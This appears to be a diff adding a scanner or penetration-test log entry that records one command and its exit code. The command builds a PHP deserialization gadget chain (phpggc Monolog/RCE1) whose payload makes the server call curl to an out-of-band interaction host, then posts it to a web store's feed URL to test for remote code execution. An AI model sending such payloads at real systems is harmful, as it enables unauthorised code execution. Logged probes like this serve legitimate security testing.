@@ -1,0 +1,4 @@
+# command: timeout 300 sh -c 'phpggc Monolog/RCE1 system '"'"'curl -s http://oob7f32ff54fd97.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/dphp'"'"' > /tmp/deser_php_$$.bin 2>/dev/null; curl -s -m 20 -o /dev/null -H '"'"'Content-Type: application/x-www-form-urlencoded'"'"' --data-binary @/tmp/deser_php_$$.bin https://duck-store.escape.tech/feeds/all.atom.xml'
+# exit_code: 0
+# ---
+
